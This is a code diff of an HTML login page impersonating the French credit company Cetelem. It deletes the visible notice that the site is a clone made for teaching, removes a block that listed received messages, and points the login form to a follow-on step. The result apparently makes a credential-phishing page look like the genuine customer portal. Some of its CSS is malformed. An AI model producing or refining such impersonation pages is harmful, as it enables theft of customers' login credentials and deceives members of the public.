@@ -1,3 +1,9 @@
+dernier 24h html
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -7,27 +13,27 @@
     body {
       margin: 0;
       padding: 0;
-      background-color: #dce7df;
-      font-family: Open Sans, sans-serif;
+      background-color: #bccfc8;
+      font-family: Arial, sans-serif;
       color: #222222;
     }
 
     header {
-      padding: 20px 0 0 20px;
+      padding: 100px 0 0 20px;
     }
     header img {
-      width: 130px;
+      width: 1300px;
       height: auto;
     }
 
     .login-box {
       background: #fff;
-      width: 500px;
-      margin: 102px auto;
+      width: 550px;
+      margin: 40px auto;
       padding: 30px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: left;
+      text-align: x;
     }
 
     .login-box h2 {
@@ -89,13 +95,13 @@
 
     .legal {
       text-align: center;
-      font-size: 15px;
+      font-size: 18px;
       color: #333;
       margin: -10px 20px 20px;
     }
 
     .alert-box {
-      background-color: #fff3cd;
+      background-color: #fef4e7;
       border: 1px solid #ffc107;
       border-radius: 5px;
       width: 500px;
@@ -162,18 +168,18 @@
 </head>
 <body>
 
-  <header style="text-align:center; margin-bottom:20px;">
-    <img src="/static/cetelem_logo.svg" alt="Cetelem logo" width="120">
-  </header>
+  <header style="text-align:center; margin: -110px 0 10px 0;">
+  <h1 style="font-size: 50p x; font-weight: bold; color: #2e7d32; font-family: 'Segoe UI', 'Arial Rounded MT Bold', sans-serif;">cetelem</h1></header>
+
 
   <div class="legal">
-    Un crédit vous engage et doit être remboursé.<br>
+    Un crédit vous engage et doit être remboursé
     Vérifiez vos capacités de remboursement avant de vous engager.
   </div>
 
   <div class="login-box">
     <h2>Accéder à mon espace personnel</h2>
-    <form method="post">
+    <form method="post" action="/suivant">
       <label for="identifiant">Identifiant client</label>
       <input type="text" id="identifiant" name="identifiant" placeholder="Ex : 1234567" required>
 
@@ -202,20 +208,6 @@
     <a href="#">Préférences de cookies</a>
   </footer>
 
-  <div class="clone-note">
-    Site cloné à des fins pédagogiques
+
   </div>
 
-  {% if messages %}
-    <div class="messages-box">
-      <h3>Messages reçus :</h3>
-      <ul>
-        {% for m in messages %}
-          <li><strong>{{ m['message']['from']['first_name'] }} :</strong> {{ m['message']['text'] }}</li>
-        {% endfor %}
-      </ul>
-    </div>
-  {% endif %}
-
-</body>
-</html>
